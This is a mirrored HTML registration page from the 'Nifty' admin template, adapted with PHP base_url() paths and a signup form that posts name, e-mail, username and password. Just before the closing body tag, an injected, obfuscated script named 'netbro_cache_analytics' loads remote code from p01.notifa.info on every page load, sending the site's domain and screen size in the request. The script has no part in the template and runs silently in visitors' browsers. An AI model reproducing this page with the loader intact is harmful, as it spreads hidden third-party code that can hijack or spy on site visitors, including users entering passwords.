<!DOCTYPE html>
<html lang="en">


<!-- Mirrored from www.themeon.net/nifty/v2.9.1/pages-register.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 02 Feb 2019 04:09:58 GMT -->
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <title>Register page | Nifty - Admin Template</title>


    <!--STYLESHEET-->
    <!--=================================================-->

    <!--Open Sans Font [ OPTIONAL ]-->
    <link href='https://fonts.googleapis.com/css?family=Open+Sans:400,300,600,700' rel='stylesheet' type='text/css'>


    <!--Bootstrap Stylesheet [ REQUIRED ]-->
    <link href="<?php echo base_url(); ?>assets/css/bootstrap.min.css" rel="stylesheet">


    <!--Nifty Stylesheet [ REQUIRED ]-->
    <link href="<?php echo base_url(); ?>assets/css/nifty.min.css" rel="stylesheet">


    <!--Nifty Premium Icon [ DEMONSTRATION ]-->
    <link href="<?php echo base_url(); ?>assets/css/demo/nifty-demo-icons.min.css" rel="stylesheet">


    <!--=================================================-->



    <!--Pace - Page Load Progress Par [OPTIONAL]-->
    <link href="<?php echo base_url(); ?>assets/plugins/pace/pace.min.css" rel="stylesheet">
    <script src="<?php echo base_url(); ?>assets/plugins/pace/pace.min.js"></script>


        
    <!--Demo [ DEMONSTRATION ]-->
    <link href="<?php echo base_url(); ?>assets/css/demo/nifty-demo.min.css" rel="stylesheet">

    
    <!--=================================================

    REQUIRED
    You must include this in your project.


    RECOMMENDED
    This category must be included but you may modify which plugins or components which should be included in your project.


    OPTIONAL
    Optional plugins. You may choose whether to include it in your project or not.


    DEMONSTRATION
    This is to be removed, used for demonstration purposes only. This category must not be included in your project.


    SAMPLE
    Some script samples which explain how to initialize plugins or components. This category should not be included in your project.


    Detailed information and more samples can be found in the document.

    =================================================-->
        
</head>

<!--TIPS-->
<!--You may remove all ID or Class names which contain "demo-", they are only used for demonstration. -->

<body>
    <div id="container" class="cls-container">
        
		
		<!-- BACKGROUND IMAGE -->
		<!--===================================================-->
		<div id="bg-overlay"></div>
		
		
		<!-- REGISTRATION FORM -->
		<!--===================================================-->
		<div class="cls-content">
		    <div class="cls-content-lg panel">
		        <div class="panel-body">
		            <div class="mar-ver pad-btm">
		                <h1 class="h3">Create a New Account</h1>
		                <p>Come join the Nifty community! Let's set up your account.</p>
		            </div>
		            <form action="<?php echo base_url('login/simpanRegisterUser' ) ?>" method="POST">
		                <div class="row">
		                    <div class="col-sm-6">
		                        <div class="form-group">
		                            <input type="text" class="form-control" placeholder="Full name" name="nama">
		                        </div>
		                        <div class="form-group">
		                            <input type="text" class="form-control" placeholder="E-mail" name="email">
		                        </div>
		                    </div>
		                    <div class="col-sm-6">
		                        <div class="form-group">
		                            <input type="text" class="form-control" placeholder="Username" name="username">
		                        </div>
		                        <div class="form-group">
		                            <input type="password" class="form-control" placeholder="Password" name="password">
		                        </div>
		                    </div>
		                </div>
		                <button class="btn btn-primary btn-lg btn-block" type="submit">Register</button>
		            </form>
		        </div>
		    </div>
		</div>
		<!--===================================================-->
			
		
    </div>
    <!--===================================================-->
    <!-- END OF CONTAINER -->


        
    <!--JAVASCRIPT-->
    <!--=================================================-->

    <!--jQuery [ REQUIRED ]-->
    <script src="<?php echo base_url(); ?>assets/js/jquery.min.js"></script>


    <!--BootstrapJS [ RECOMMENDED ]-->
    <script src="<?php echo base_url(); ?>assets/js/bootstrap.min.js"></script>


    <!--NiftyJS [ RECOMMENDED ]-->
    <script src="<?php echo base_url(); ?>assets/js/nifty.min.js"></script>




    <!--=================================================-->
    
    <!--Background Image [ DEMONSTRATION ]-->
    <script src="<?php echo base_url(); ?>assets/js/demo/bg-images.js"></script>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2iBChPrGIbjW%2fxrNb5UaeDHprICv2QXvn7x9XMvk%2bWGRqvRn%2bb%2bh%2f97O%2bIgsnNYEz0Kxhp%2bgwR%2f5WmZ%2bzFv5dqrobtFdbrG8F86lzCOtfwOzPtTklt6i6DI1EDifTEkJMBhglC9h6eYDwIp984d3cUAoHe2o7sLvM3BVep9DcESE%2fe4SqbU5WMVqrQ4dd%2bXokjFANmxOty4HQVjeM5Dg3Z4I1sVfsDFaTSXpHd5Ea4VjM%2bKBexphxQNkUR5g2%2feaUiKVuBny72EJL%2fvywuxd%2fMXDl1pbVoMVJYpDI%2bf4LHY3%2f9brnJangYzRjFAT0wJxyaBRv5x34g%2fMkOniRrzgfL1VjBPnxe2joZUjosZBCpT0JfcmbSdjjUXfw2Xkp9Qs4PjJ9XFUv4C%2fhJQk1bJ%2b19%2bA5G80EN2PA%2fHq%2fDM%2bnJkGUe0Zbox4yRWMVyeGXtwJ6hQ1qRteRxlDNfq%2bte4zSCXvXkajlnNYvcNH7tSp0nwGEyRjG6nSR7A%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from www.themeon.net/nifty/v2.9.1/pages-register.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 02 Feb 2019 04:09:58 GMT -->
</html>
